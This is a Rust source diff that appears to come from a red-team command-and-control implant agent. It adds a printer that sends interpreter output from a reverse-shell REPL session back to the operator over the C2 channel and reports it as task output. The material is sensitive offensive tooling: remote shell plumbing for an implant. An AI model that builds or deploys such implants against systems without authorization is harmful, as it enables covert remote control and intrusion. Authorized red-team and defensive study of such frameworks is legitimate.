@@ -1,6 +1,10 @@
 use anyhow::Result;
-use pb::c2::{ReverseShellMessageKind, ReverseShellRequest, ReverseShellResponse};
+use pb::c2::{
+    ReportTaskOutputRequest, ReverseShellMessageKind, ReverseShellRequest, ReverseShellResponse,
+    TaskOutput,
+};
 use portable_pty::{native_pty_system, CommandBuilder, PtySize};
+use std::fmt;
 use std::io::{BufWriter, Read, Write};
 use std::path::Path;
 use std::sync::Arc;
@@ -13,8 +17,9 @@ use crossterm::{
     terminal, QueueableCommand,
 };
 use eldritch_core::Value;
+use eldritch_libagent::agent::Agent;
 use eldritch_repl::{Input, Repl, ReplAction};
-use eldritchv2::Interpreter;
+use eldritchv2::{Interpreter, Printer, Span};
 
 pub async fn run_reverse_shell_pty<T: Transport>(
     task_id: i64,
@@ -235,7 +240,13 @@ async fn run_repl_loop<T: Transport + Send + Sync + 'static>(
     agent: ImixAgent<T>,
 ) {
     let _ = tokio::task::spawn_blocking(move || {
-        let mut interpreter = Interpreter::new()
+        let printer = Arc::new(ShellPrinter {
+            tx: output_tx.clone(),
+            task_id,
+            agent: agent.clone(),
+        });
+
+        let mut interpreter = Interpreter::new_with_printer(printer)
             .with_default_libs()
             .with_task_context(Arc::new(agent), task_id, Vec::new());
         let mut repl = Repl::new();
@@ -309,6 +320,64 @@ async fn run_repl_loop<T: Transport + Send + Sync + 'static>(
         }
     })
     .await;
+}
+
+struct ShellPrinter<T: Transport> {
+    tx: tokio::sync::mpsc::Sender<ReverseShellRequest>,
+    task_id: i64,
+    agent: ImixAgent<T>,
+}
+
+impl<T: Transport + Send + Sync> fmt::Debug for ShellPrinter<T> {
+    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
+        f.debug_struct("ShellPrinter")
+            .field("task_id", &self.task_id)
+            .finish()
+    }
+}
+
+impl<T: Transport + Send + Sync + 'static> Printer for ShellPrinter<T> {
+    fn print_out(&self, _span: &Span, s: &str) {
+        // Send to REPL
+        let display_s = format!("{}\r\n", s);
+        let _ = self.tx.blocking_send(ReverseShellRequest {
+            kind: ReverseShellMessageKind::Data.into(),
+            data: display_s.into_bytes(),
+            task_id: self.task_id,
+        });
+
+        // Report Task Output
+        let req = ReportTaskOutputRequest {
+            output: Some(TaskOutput {
+                id: self.task_id,
+                output: format!("{}\n", s),
+                error: None,
+                exec_started_at: None,
+                exec_finished_at: None,
+            }),
+        };
+        let _ = self.agent.report_task_output(req);
+    }
+
+    fn print_err(&self, _span: &Span, s: &str) {
+        let display_s = format!("{}\r\n", s);
+        let _ = self.tx.blocking_send(ReverseShellRequest {
+            kind: ReverseShellMessageKind::Data.into(),
+            data: display_s.into_bytes(),
+            task_id: self.task_id,
+        });
+
+        let req = ReportTaskOutputRequest {
+            output: Some(TaskOutput {
+                id: self.task_id,
+                output: format!("{}\n", s),
+                error: None,
+                exec_started_at: None,
+                exec_finished_at: None,
+            }),
+        };
+        let _ = self.agent.report_task_output(req);
+    }
 }
 
 struct VtWriter {
